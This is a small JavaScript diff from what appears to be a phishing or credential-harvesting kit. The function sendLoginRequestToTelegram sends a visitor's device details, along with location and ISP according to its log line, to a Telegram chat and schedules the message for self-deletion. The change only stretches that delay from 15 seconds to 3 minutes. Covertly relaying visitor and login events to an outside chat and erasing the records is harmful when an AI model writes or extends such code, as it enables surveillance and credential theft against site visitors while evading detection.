@@ -308,7 +308,7 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
 🖥️ <b>Device:</b> ${navigator.userAgent.substring(0, 80)}
 ━━━━━━━━━━━━━━━━━━━━━
 ⚠️ <i>A visitor is on your website!</i>
-⏰ <i>This message will self-delete in 15 seconds</i>`;
+⏰ <i>This message will self-delete in 3 minute</i>`;
     
     const response = await axios.post(url, { 
       chat_id: LOGS_CHAT_ID, 
@@ -317,7 +317,7 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
     });
     
     const messageId = response.data.result.message_id;
-    deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
+    deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 180000);
     
     console.log('✅ Site entry log sent with location and ISP');
   } catch (error) {
